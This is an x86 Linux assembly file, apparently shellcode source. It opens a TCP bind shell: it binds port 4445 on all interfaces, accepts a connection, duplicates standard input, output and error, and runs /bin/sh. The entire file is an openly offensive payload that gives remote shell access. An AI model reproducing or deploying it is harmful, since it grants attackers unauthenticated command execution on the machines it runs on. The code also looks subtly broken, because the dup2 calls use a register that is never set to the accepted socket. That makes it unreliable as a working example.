; File: bind_tcp.asm
; Author: NiAllen Macy

global main

section .text
main:
	; sock = socket(AF_INET, SOCK_STREAM, IPPROTO)
	push 0x66
	pop eax
	push 0x1
	pop ebx
	xor edx,edx
	push edx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80
	mov esi, eax

	; bind(sock, [AF_INET, PORT, IPADDR_ANY], 16)
	push 0x66
	pop eax
	mov bl, 0x2
	push edx
	push word 0x5d11
	push word bx
	mov ecx, esp
	push 0x10
	push ecx
	push esi
	mov ecx, esp
	int 0x80

	; listen(sock, 0)
	mov al, 0x66
	mov bl, 0x4
	push edx
	push esi
	mov ecx, esp
	int 0x80

	; client = accept(sock, 0, 0)
	mov al, 0x66
	mov bl, 0x5
	push edx
	push edx
	push esi
	mov ecx, esp
	int 0x80
	mov esi,eax

	; dup2(sock, 0)
	push 0x3f
	pop eax
	mov ebx, edi
	mov ecx, edx
	int 0x80

	; dup2(sock, 1)
	push 0x3f
	pop eax
	mov ebx, edi
	inc cl
	int 0x80

	; dup2(sock, 2)
	push 0x3f
	pop eax
	mov ebx, edi
	inc cl
	int 0x80

	; execve("/bin/sh",*"bin/sh",0)
	push byte 0xb
	pop eax
	xor edx,edx
	push edx
	push dword 0x68732f2f
    push dword 0x6e69622f
	mov ebx, esp
	push edx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80

	; return(0)
	;mov al, 1
	;mov bl, 0
	;int 0x80
